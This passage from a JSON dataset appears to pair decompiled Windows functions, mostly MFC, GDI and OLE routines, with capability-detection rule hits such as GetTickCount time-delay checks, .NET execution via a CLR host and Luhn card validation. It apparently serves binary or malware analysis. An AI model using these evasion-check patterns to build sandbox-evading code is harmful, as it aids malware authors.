            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045631a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00461b9c(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "0041770e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041770e(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    iVar3 = (*_sym.imp.ole32.dll_ReadClassStg)(arg_8h, &var_14h);\n    if (iVar3 != 0) goto code_r0x004177cd;\n    var_20h = 0;\n    (*_sym.imp.ole32.dll_ReadFmtUserTypeStg)(arg_8h, &var_28h, &var_20h);\n    var_24h = 0;\n    var_18h = NULL;\n    iVar3 = (*_sym.imp.ole32.dll_OleRegGetUserType)(arg_ch, 1, &var_18h);\n    pcVar1 = _sym.imp.ole32.dll_WriteClassStg;\n    if (iVar3 != 0) {\n        var_18h = &var_24h;\n    }\n    var_1ch = (*_sym.imp.ole32.dll_WriteClassStg)(arg_8h, arg_ch);\n    pcVar2 = _sym.imp.ole32.dll_WriteFmtUserTypeStg;\n    if (var_1ch == 0) {\n        var_1ch = (*_sym.imp.ole32.dll_WriteFmtUserTypeStg)(arg_8h, var_28h, var_18h);\n        if (var_1ch == 0) {\n            var_1ch = (*_sym.imp.ole32.dll_SetConvertStg)(arg_8h, 1);\n            if (var_1ch == 0) goto code_r0x004177b2;\n        }\n        (*pcVar1)(arg_8h, &var_14h);\n        (*pcVar2)(arg_8h, var_28h, var_20h);\n    }\ncode_r0x004177b2:\n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    if (var_18h != &var_24h) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(var_18h);\n    }\n    (*pcVar1)(var_20h);\ncode_r0x004177cd:\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 599
    },
    "0041d369": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041d369(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    int32_t var_14h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0041d2f6(arg_8h, &var_8h, &var_4h);\n    iVar1 = fcn.0041c3fa(arg_8h, &var_24h, 2);\n    if (iVar1 != 0) {\n        var_4h = var_4h - (-(var_14h != 1) & var_14h - 1U);\n    }\n    return var_4h;\n}\n",
        "token_count": 164
    },
    "00427ba7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427ba7(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    \n    var_24h = arg_8h;\n    var_28h = 0x18;\n    var_1ch = 0xf000;\n    var_20h = ((arg_ch != 0) + 1) * 0x1000;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x110d, 0, &var_28h);\n    return;\n}\n",
        "token_count": 161
    },
    "0042e286": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e286(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_ch;\n    uint var_4h;\n    \n    if (*arg_8h == 0) {\n        _var_ch = 0;\n        var_4h = 0;\n        fcn.0042de93(*arg_10h, 0, 0x400);\n        fcn.0042e24c(arg_8h, arg_ch, &var_ch);\n    }\n    else {\n        fcn.0042cc88(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0042e567": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e567(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    int32_t var_28h;\n    uint var_24h;\n    \n    var_24h = 0xf000;\n    var_28h = ((arg_ch != 0) + 1) * 0x1000;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x102b, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 134
    },
    "0042eb59": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: lprcSrc1\n\nvoid __cdecl\nfcn.0042eb59(uint lprcSrc2, uint dx, uint dy, uint lprcSrc, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t unaff_EBP;\n    uint lprcSrc1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x38);\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x34) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x24) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.0042831b(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0xc), -*(unaff_EBP + 0x10));\n    (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 8));\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x44);\n    fcn.0041a54f(uVar2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n    fcn.0041a54f(uVar2);\n    fcn.0042e91e(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n    if (*(unaff_EBP + 0x20) == 0) {\n        uVar2 = fcn.0042eab6();\n        *(unaff_EBP + 0x20) = uVar2;\n    }\n    iVar3 = *(unaff_EBP + 0x20);\n    if (iVar3 == 0) {\n        fcn.0041901a();\n        iVar3 = extraout_ECX_00;\n    }\n    if (*(unaff_EBP + 0x24) == 0) {\n        *(unaff_EBP + 0x24) = iVar3;\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = _sym.imp.GDI32.dll_CreateRectRgn;\n    if (*(unaff_EBP + 0x14) != 0) {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n        fcn.0041a54f(uVar2);\n        fcn.0042e903(*(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0x18), -*(unaff_EBP + 0x1c));\n        (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        fcn.0042e903(unaff_EBP + -0x44);\n        fcn.0042e91e(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n        if (*(*(unaff_EBP + 0x20) + 4) == *(*(unaff_EBP + 0x24) + 4)) {\n            uVar2 = (*pcVar1)(0, 0, 0, 0);\n            fcn.0041a54f(uVar2);\n            fcn.0042e91e(unaff_EBP + -0x1c, unaff_EBP + -0x34, 3);\n        }\n    }\n    pcVar1 = _sym.imp.GDI32.dll_PatBlt;\n    if ((*(*(unaff_EBP + 0x20) + 4) != *(*(unaff_EBP + 0x24) + 4)) && (*(unaff_EBP + 0x14) != 0)) {\n        fcn.00419e24(unaff_EBP + -0x1c);\n        (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n        uVar2 = fcn.0041a6e8(*(unaff_EBP + 0x24));\n        *(unaff_EBP + 0x14) = uVar2;\n        (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), \n                  *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n        fcn.0041a6e8(*(unaff_EBP + 0x14));\n    }\n    iVar3 = unaff_EBP + -0x14;\n    if (*(unaff_EBP + -0x10) == 0) {\n        iVar3 = unaff_EBP + -0x34;\n    }\n    fcn.00419e24(iVar3);\n    (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n    uVar2 = fcn.0041a6e8(*(unaff_EBP + 0x20));\n    *(unaff_EBP + 0x14) = uVar2;\n    (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), \n              *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n    if (*(unaff_EBP + 0x14) != 0) {\n        fcn.0041a6e8(*(unaff_EBP + 0x14));\n    }\n    fcn.00419e24(0);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x34) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 2235
    },
    "0042eeab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042eeab(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (arg_ch == 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    }\n    else {\n        uVar2 = *(arg_ch + 8);\n    }\n    puVar5 = &var_40h;\n    for (iVar4 = 0xf; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar5 = puVar5 + 1;\n    }\n    uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x5a, var_40h, 0x2d0);\n    var_44h = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar3);\n    pcVar1 = _sym.imp.GDI32.dll_DPtoLP;\n    var_48h = 0;\n    (*_sym.imp.GDI32.dll_DPtoLP)(uVar2, &var_48h, 1);\n    uVar3 = 1;\n    var_50h = 0;\n    var_4ch = 0;\n    (*pcVar1)(uVar2, &var_50h);\n    iVar4 = fcn.0045931b(var_44h - var_4ch);\n    var_40h = -iVar4;\n    if (arg_ch == 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    fcn.0042b8c1(&var_40h);\n    fcn.004566a8(uVar3);\n    return;\n}\n",
        "token_count": 513
    },
    "00432225": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00432225(void)\n\n{\n    uint arg_8h;\n    uint var_18h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 111
    },
    "00434a8c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434a8c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = fcn.0045931b(arg_8h);\n    puVar1 = fcn.004348f4(&var_24h, 10000);\n    var_ch = *puVar1;\n    var_8h = puVar1[1];\n    var_4h = puVar1[2];\n    if (arg_8h < 0) {\n        puVar1 = fcn.004348b1(&var_24h);\n        var_ch = *puVar1;\n        var_8h = puVar1[1];\n        var_4h = puVar1[2];\n    }\n    var_18h = fcn.0045931b(arg_ch);\n    if (arg_ch < 0) {\n        puVar1 = fcn.004348b1(&var_24h);\n        var_18h = *puVar1;\n        var_14h = puVar1[1];\n        var_10h = puVar1[2];\n    }\n    uVar2 = fcn.004347ed(&var_24h, &var_18h);\n    fcn.004337bc(uVar2);\n    *(in_ECX + 8) = 0;\n    return;\n}\n",
        "token_count": 400
    },
    "004374b5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004374b5(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    int32_t iVar8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar8 = 0;\n    if (*(in_ECX + 0x68) == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetCapture)();\n    iVar2 = fcn.00437331(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(iVar2 + 0x20);\n    }\n    iVar3 = fcn.0041ffa6();\n    uVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n    fcn.0041e67e(uVar4);\n    iVar5 = fcn.0041ffa6();\n    var_ch = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    if (iVar2 != 0) {\n        iVar8 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, 0);\n    }\n    if ((iVar5 == 0) || (iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  iVar2 == iVar7)) {\n        uVar4 = *0x4ad238;\n        if (iVar1 == *(in_ECX + 0x20)) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            uVar4 = *0x4ad238;\n        }\ncode_r0x004375a9:\n        (*_sym.imp.USER32.dll_SetCursor)(uVar4);\n        goto code_r0x004375af;\n    }\n    if (iVar2 == 0) {\ncode_r0x00437578:\n        if (iVar6 != iVar8) goto code_r0x0043757d;\n    }\n    else {\n        if (iVar6 == iVar8) {\n            uVar4 = *(in_ECX + 0x20);\n            iVar7 = fcn.0044569f();\n            if (iVar7 != 0) {\n                var_ch = 1;\n                if (iVar5 != iVar3) {\n                    iVar2 = 0;\n                    goto code_r0x004375af;\n                }\n                uVar4 = *0x4ad23c;\n                if (iVar1 != *(in_ECX + 0x20)) {\n                    (*_sym.imp.USER32.dll_SetCapture)(*(in_ECX + 0x20));\n                    uVar4 = *0x4ad23c;\n                }\n                goto code_r0x004375a9;\n            }\n            goto code_r0x00437578;\n        }\ncode_r0x0043757d:\n        iVar2 = 0;\n    }\n    if (iVar1 == *(in_ECX + 0x20)) {\n        (*_sym.imp.USER32.dll_ReleaseCapture)(uVar4);\n    }\ncode_r0x004375af:\n    if (arg_10h != NULL) {\n        *arg_10h = var_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 761
    },
    "0043c6d5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.0043c6d5(uint16_t param_1)\n\n{\n    if ((param_1 & 0x4000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x2000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x1000) != 0) {\n        return 2;\n    }\n    if (0x48 < param_1) {\n        if ((param_1 != 0x80) && (param_1 != 0x81)) {\n            if (param_1 == 0x82) {\n                return 2;\n            }\n            if (param_1 != 0x83) {\n                if (param_1 == 0x85) {\n                    return 2;\n                }\n                if (param_1 == 0x86) {\n                    return 2;\n                }\n                if (param_1 == 0x87) {\n                    return 2;\n                }\n                return 8;\n            }\n        }\ncode_r0x0043c735:\n        return 1;\n    }\n    if (param_1 == 0x48) {\ncode_r0x0043c6df:\n        return 4;\n    }\n    // switch table (20 cases) at 0x43c739\n    switch(param_1) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        return 2;\n    case 3:\n    case 4:\n    case 8:\n    case 9:\n    case 10:\n    case 0xd:\n    case 0x13:\n        goto code_r0x0043c6df;\n    default:\n        return 8;\n    case 0x10:\n    case 0x11:\n    case 0x14:\n    case 0x15:\n        goto code_r0x0043c735;\n    }\n}\n",
        "token_count": 424
    },
    "00440286": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00440286(int32_t param_1)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (*(param_1 + 0x48) == 0) {\n        if (*(param_1 + 0x38) != 0) {\n            var_10h = *(param_1 + 0x40);\n            var_ch = 0;\n            var_8h = 0;\n            var_18h = 1;\n            var_14h = 0;\n            uVar1 = (**(**(param_1 + 8) + 0x20))(*(param_1 + 8), 1, 0x4972c6, 0, 0, &var_18h);\n            return uVar1;\n        }\n    }\n    else if ((*(param_1 + 0x50) != 0) && (*(*(param_1 + 0x50) + 0xc) != 0)) {\n        uVar1 = fcn.0043fc95();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "00441fcd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nint32_t __fastcall fcn.00441fcd(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **ppiStack76;\n    uchar *puStack72;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((*(param_1 + 4) != 0) && (*(*(param_1 + 4) + 0x28) != 0)) {\n        puStack72 = 0x441ff4;\n        var_4h = fcn.0041ffa6();\n        if (var_4h != 0) {\n            puStack72 = *(var_4h + 0x20);\n            ppiStack76 = 0x442004;\n            iVar4 = (*_sym.imp.USER32.dll_IsWindowVisible)();\n            var_14h = iVar4 == 0;\n            if (var_14h != 0) {\n                ppiStack76 = 0x442014;\n                ppiStack76 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                iVar4 = fcn.0041e67e();\n                pcVar3 = _sym.imp.USER32.dll_GetWindowRect;\n                (*_sym.imp.USER32.dll_GetWindowRect)(*(iVar4 + 0x20), &fcn.00441fcd::var_34h);\n                (*pcVar3)(*(var_4h + 0x20), &fcn.00441fcd::var_24h);\n                var_28h = var_28h - var_30h;\n                var_30h = 0;\n                var_34h = 0;\n                puStack72 = 0x442058;\n                fcn.004226bf(var_2ch / 2, var_28h / 2, 0, 0, 0);\n                puStack72 = 0x1;\n                ppiStack76 = 0x442062;\n                fcn.004226fd();\n            }\n            puVar1 = *(*(param_1 + 4) + 0x50);\n            ppiStack76 = param_1 + 0x48;\n            iVar4 = (***puVar1)(puVar1, 0x48f620);\n            if (iVar4 < 0) {\n                puVar1 = *(*(param_1 + 4) + 0x50);\n                iVar4 = (***puVar1)(puVar1, 0x48f678, &fcn.00441fcd::var_ch);\n                if (iVar4 < 0) {\n                    return iVar4;\n                }\n                (**(*var_ch + 0x14))(var_ch, &fcn.00441fcd::var_10h);\n                (**(*var_ch + 8))(var_ch);\n                if (var_10h == NULL) {\n                    return -0x7fffbffb;\n                }\n                var_8h = (***var_10h)(var_10h, 0x494ee4, param_1 + 8);\n                (**(*var_10h + 8))(var_10h);\n                if 